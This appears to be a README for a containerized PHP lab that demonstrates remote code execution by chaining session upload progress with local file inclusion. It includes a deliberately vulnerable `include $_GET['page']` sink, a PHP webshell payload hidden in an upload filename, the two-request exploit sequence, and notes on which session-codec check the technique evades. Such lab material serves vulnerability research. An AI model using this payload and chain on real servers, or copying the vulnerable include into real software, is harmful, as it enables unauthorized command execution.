# Wiz-style php2shell PoC fixture (`cms-lab/`)

Containerized CMS-shaped lab on the official **php:8.4.26-cli** image (unpatched)
with:

- `app/wp-upload.php` — upload endpoint with `session.upload_progress=On`
- `app/wp-content.php?page=` — CMS-shaped `include $_GET['page']` LFI sink
- `run.sh` — container boot (PHP_CLI_SERVER_WORKERS=4 to mirror a real pool)

Sequence run by `poc_vanilla_rce.py`:

1. POST `/wp-upload.php` multipart with `PHPSESSID=<sid>` and a file whose
   **filename** is `<?php echo "[RCE-OUT]";system($_REQUEST[c]); ?>` — lands
   verbatim inside `/tmp/sessions/sess_<SID>` (session session values aren't
   guarded against our payload bytes; only the php-codec KEYs are guarded
   against `|`).
2. GET `/wp-content.php?page=/tmp/sessions/sess_<SID>&c=id` — the include fires
   the PHP tag in the session file and the command runs.

To run:

```bash
./run.sh 8443                      # start the container
python3 poc_vanilla_rce.py http://127.0.0.1:8443
```

## Why default codec is enough here (and why KEY-suffix forge is not)

- The `php` session codec validates only the KEYs for the `|` delimiter
  (`memchr(key, '|')` at `ext/session/session.c:1055-1065`): keys are written raw.
- Serialized *values* aren't validated for pipes — so a UPLOAD filename containing
  arbitrary PHP text persists textually in the session file's serialized byte
  stream — and an app include() runs it.
- The widely-posted "PHP_SESSION_UPLOAD_PROGRESS suffix forge" (suffix = serialized
  attacker payload inside the KEY slot) is what the pipe check kills.

Both facts we validated against the on-stock official docker image inside this
directory (results intended under `RESULTS/`, generated on demand).
